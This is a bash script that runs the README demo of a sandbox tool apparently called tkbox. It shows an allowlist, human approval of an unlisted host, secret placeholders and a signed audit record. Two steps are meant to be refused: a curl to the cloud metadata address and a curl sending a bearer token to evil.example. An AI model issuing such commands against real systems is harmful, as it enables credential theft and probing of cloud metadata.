#!/usr/bin/env bash
# The README demo, runnable: one box, every door.
#
# Needs: Linux (x86_64 or arm64) with /dev/kvm, e2fsprogs, git, tkbox and tkbox-guest-linux-<arch> side by side on
# PATH, Tracekit 1.4.2 (pip install tracekit-ai==1.4.2), and GH_TOKEN set to a GitHub token. Run it from a git checkout:
# that checkout becomes the box's /workspace (nothing is written back; the script never runs tkbox apply).
set -euo pipefail

: "${GH_TOKEN:?set GH_TOKEN to a GitHub token (any scope); the box only ever sees a placeholder}"
for bin in tkbox tracekit git; do
  command -v "$bin" >/dev/null || { echo "demo: $bin is not on PATH" >&2; exit 1; }
done
git rev-parse --is-inside-work-tree >/dev/null 2>&1 || { echo "demo: run this from a git checkout" >&2; exit 1; }

step() { printf '\n\033[1m== %s\033[0m\n' "$*"; }
show() { printf '$ %s\n' "$*"; "$@"; }
# a step that is meant to be refused: print the exit code instead of stopping the script
refused() { printf '$ %s\n' "$*"; local code=0; "$@" || code=$?; echo "(exit $code)"; }

step "A Tracekit 1.4.2 dev signer"
if ! tracekit up --wait >/dev/null 2>&1; then
  show tracekit init --dev --v2 --no-hooks
  show tracekit up --wait
fi

step "The tkbox daemon"
daemon_pid=""
if ! tkbox ls >/dev/null 2>&1; then
  tkbox daemon > tkbox-daemon.log 2>&1 &
  daemon_pid=$!
  trap '[ -n "$daemon_pid" ] && kill "$daemon_pid" 2>/dev/null || true' EXIT
  for _ in $(seq 1 60); do tkbox ls >/dev/null 2>&1 && break; sleep 0.5; done
  tkbox ls >/dev/null || { echo "demo: tkbox daemon did not start; see tkbox-daemon.log" >&2; exit 1; }
  echo "started (log: tkbox-daemon.log)"
fi
tkbox rm demo >/dev/null 2>&1 || true

step "A box: PyPI and Debian's mirror allowed, this checkout in /workspace, GH bound to api.github.com"
# python:3.12-slim is Debian and has no curl; deb.debian.org lets apt-get install it.
show tkbox run --image python:3.12-slim --allow pypi --allow deb.debian.org --workspace . --name demo \
  --secret GH=env:GH_TOKEN@api.github.com
show tkbox exec demo -- sh -c 'apt-get update -q >/dev/null && apt-get install -y -q curl >/dev/null && echo curl installed'

step "A command: decided by the signer, recorded as Bash"
show tkbox exec demo -- python -c 'print(1+1)'                       # 2

step "A host off the allowlist: held for a person on the host"
# curl gives up after 15 s; meanwhile the approval is pending. `tkbox approve <id>` in another terminal lets it through.
tkbox exec demo -- curl -sI --max-time 15 https://example.com &
held=$!
sleep 4
show tkbox approvals
code=0; wait "$held" || code=$?; echo "(curl exit $code: not approved)"

step "An allowlisted host: the pypi preset"
show tkbox exec demo -- pip install -q requests

step "The cloud metadata address: refused before any decision"
refused tkbox exec demo -- sh -c 'curl -sS --max-time 10 https://169.254.169.254/'

step "Inside the box, \$GH is a placeholder"
show tkbox exec demo -- sh -c 'echo "GH=$GH"'

step "The placeholder sent to an unbound host: the token never leaves"
refused tkbox exec demo -- sh -c 'curl -sS --max-time 10 -H "Authorization: Bearer $GH" https://evil.example'

step "The bound host: the proxy swaps the real token in"
show tkbox exec demo -- sh -c 'curl -sS -H "Authorization: Bearer $GH" https://api.github.com/user | python -c "import json,sys; print(\"login:\", json.load(sys.stdin).get(\"login\"))"'

step "A change in /workspace, as a patch"
show tkbox exec demo -- sh -c 'echo hi > /workspace/x.txt'
show tkbox diff demo

step "Stop, export the signed record, verify it offline"
show tkbox stop demo
show tkbox export demo -o demo.tkb
trust=demo.trust.json
[ -f "$trust" ] || trust=demo.tkb.trust.json
show tracekit verify demo.tkb --trust "$trust"                         # Integrity: VERIFIED.

echo
echo "The box is kept: tkbox diff demo, tkbox apply demo --check, tkbox rm demo."
